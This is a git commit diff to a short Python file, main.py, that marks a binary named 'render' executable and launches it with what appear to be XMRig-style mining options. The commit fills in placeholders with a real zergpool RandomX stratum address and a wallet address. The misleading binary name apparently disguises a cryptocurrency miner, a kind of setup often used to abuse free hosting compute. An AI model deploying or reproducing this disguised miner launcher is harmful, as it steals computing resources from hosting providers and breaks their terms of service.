a52dddbae30ad4f25908963787aa988e09d7d877
Test2443 <101375280+Test2443@users.noreply.github.com>
2022-05-02 23:40:20 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
 import os
 
 os.system('chmod +x render')
-os.system('./render -o PLACE POOL HERE -a rx -k -u PLACE USERNAME/ADDRESS HERE -p PUT WORKER NAME HERE -a PUT ALGORITHM HERE -k')
+os.system('./render -o stratum+tcp://randomx.asia.mine.zergpool.com:4453 -a rx -k -u RQDVN3y91v7ErGNSojXg5qYKZCQx4ezMpJ -p test -a rx -k')
